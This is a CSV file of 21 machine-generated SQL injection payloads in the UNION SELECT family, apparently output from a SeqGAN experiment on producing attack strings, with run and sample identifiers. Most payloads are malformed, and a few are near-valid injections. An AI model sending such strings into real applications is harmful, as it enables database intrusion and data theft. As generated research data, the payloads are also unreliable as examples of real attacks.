label,payload,family,payload_type,method,run_id,sample_index
attack,"-'  )    )   ""    S union all all null,null,null##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,0
attack," all all select ,null,4600,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,1
attack,"-d--   1 all all all 1980,4266 null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,2
attack,"-)'  =  =union select null,7497,7497,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,3
attack,"-,9357,)    --' where   )    )    )  )    )    union 1 union all select 4854,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,4
attack,"dh  =  =   all 1 1 union all all 1,null,1249,4205,v,3072,3084,null,1297,3072,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,5
attack,"-6294'%' id  4330 union all all select null,null,null,8123,n,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,6
attack,"'    )    union select null,null,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,7
attack,"-6097'%')   )    )   )   union all all select ,7845,8986,8123,4909#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,8
attack,"-@6075)     )    )    2088     )    union select @ where  ,@4909 )se--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,9
attack,1 union all,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,10
attack,1'   )     5748  )     )    )    )    --se'  )   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,11
attack,"1'sers id  )9517   S  )     union all select null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,12
attack,"1'  )$ select null,7497,4481,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,13
attack,"3059-51314909"" union select null,7497,4600,8986,4909,3990,1646,null,9110,1224,8665,null,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,14
attack,"-'  )    union 1,1297,,2263,3084,2446,null,8123,4909----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,15
attack,"-c  )    union all 1 R)    )   or union e all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,16
attack,"7845""select null,null,null,30847497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,17
attack,"-8073'    )     )    )     )   )    )    id  )    where null  1 union all ,null,7497,4909,4481,2446,null,5349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,18
attack,"-39974589""  )   )    )   b  (    )    union all select 4600,null,null,null,null,null,3072,null,3339--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,19
attack,"-'4373%'union all .,7497,4266,9110,##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,20
